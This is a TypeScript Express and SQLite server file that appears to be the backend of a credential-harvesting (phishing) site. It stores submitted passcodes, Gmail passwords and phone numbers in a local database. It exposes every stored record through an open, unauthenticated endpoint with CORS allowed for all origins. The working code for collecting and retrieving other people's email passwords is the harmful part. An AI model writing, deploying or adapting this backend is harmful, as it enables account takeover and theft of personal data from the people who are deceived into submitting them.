import express from "express";
import { createServer as createViteServer } from "vite";
import Database from "better-sqlite3";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import cors from "cors";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const dbPath = path.resolve(__dirname, "submissions.db");
let db: Database.Database;
try {
  db = new Database(dbPath);
  console.log(`Database initialized at ${dbPath}`);
  
  // Initialize database
  db.exec(`
    CREATE TABLE IF NOT EXISTS submissions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      passcode TEXT,
      gmail_password TEXT,
      phone_number TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  console.log("Submissions table ensured");

  // Write test
  try {
    db.prepare("INSERT INTO submissions (passcode) VALUES (?)").run("init_test");
    db.prepare("DELETE FROM submissions WHERE passcode = ?").run("init_test");
    console.log("Database write test successful");
  } catch (writeErr) {
    console.error("Database write test failed:", writeErr);
  }
} catch (err) {
  console.error("Failed to initialize database:", err);
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Enable CORS for all routes
  app.use(cors());
  app.use(express.json());

  // Logging middleware
  app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
  });

  // Test route
  app.get("/api/test", (req, res) => {
    res.json({ message: "API is working", time: new Date().toISOString() });
  });

  // API Route to handle submissions
  const handleSubmission = (req: express.Request, res: express.Response) => {
    console.log("POST /api/v1/submit hit with body:", req.body);
    const { passcode, gmailPassword, phoneNumber } = req.body;
    
    if (!passcode && !gmailPassword && !phoneNumber) {
      return res.status(400).json({ error: "Empty submission" });
    }
    
    try {
      const stmt = db.prepare("INSERT INTO submissions (passcode, gmail_password, phone_number) VALUES (?, ?, ?)");
      const result = stmt.run(passcode || "", gmailPassword || "", phoneNumber || "");
      
      console.log("Successfully saved submission, ID:", result.lastInsertRowid);
      res.json({ success: true, id: result.lastInsertRowid });
    } catch (error) {
      console.error("Database error during save:", error);
      res.status(500).json({ error: "Failed to save submission" });
    }
  };

  app.post("/api/v1/submit", handleSubmission);
  app.post("/api/v1/submit/", handleSubmission);

  // API Route to view submissions
  const handleGetSubmissions = (req: express.Request, res: express.Response) => {
    console.log("GET /api/v1/submissions hit");
    try {
      const rows = db.prepare("SELECT * FROM submissions ORDER BY created_at DESC").all();
      console.log(`Returning ${rows.length} submissions`);
      res.json(rows);
    } catch (error) {
      console.error("Database error during fetch:", error);
      res.status(500).json({ error: "Failed to fetch submissions" });
    }
  };

  app.get("/api/v1/submissions", handleGetSubmissions);
  app.get("/api/v1/submissions/", handleGetSubmissions);

  // Vite middleware for development
  let vite: any;
  if (process.env.NODE_ENV !== "production") {
    vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "custom",
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.join(__dirname, "dist")));
  }

  // Catch-all route to serve index.html for SPA routing
  app.get("*", async (req, res, next) => {
    // Skip API routes that might have reached here
    if (req.url.startsWith("/api/")) {
      return res.status(404).json({ error: "API route not found" });
    }

    const url = req.originalUrl;

    try {
      if (process.env.NODE_ENV !== "production") {
        let template = fs.readFileSync(path.resolve(__dirname, "index.html"), "utf-8");
        template = await vite.transformIndexHtml(url, template);
        res.status(200).set({ "Content-Type": "text/html" }).end(template);
      } else {
        res.sendFile(path.join(__dirname, "dist", "index.html"));
      }
    } catch (e: any) {
      if (process.env.NODE_ENV !== "production") {
        vite.ssrFixStacktrace(e);
      }
      next(e);
    }
  });

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
